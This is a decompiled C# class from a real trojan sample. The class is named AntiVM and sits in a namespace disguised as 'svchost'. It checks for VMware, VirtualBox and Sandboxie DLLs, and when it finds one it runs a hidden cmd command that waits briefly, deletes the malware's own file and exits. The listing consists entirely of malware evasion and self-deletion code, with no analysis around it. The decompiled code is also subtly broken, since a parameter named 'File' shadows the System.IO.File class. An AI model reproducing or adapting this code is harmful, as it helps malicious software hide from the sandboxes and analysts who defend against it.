// Decompiled with JetBrains decompiler
// Type: svchost.Antis.AntiVM
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace svchost.Antis
{
  [OptionText]
  public class AntiVM
  {
    public void ST(string File)
    {
      try
      {
        if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\vmGuestLib.dll"))
          this.D(File);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (File.Exists(Environment.GetEnvironmentVariable("windir") + "\\vboxmrxnp.dll"))
          this.D(File);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (!AntiVM.LoadLibrary("SbieDll.dll"))
          return;
        this.D(File);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32.dll")]
    public static extern bool LoadLibrary(string dllToLoad);

    public void D(string F)
    {
      try
      {
        Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + F + "\"", AppWinStyle.Hide);
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
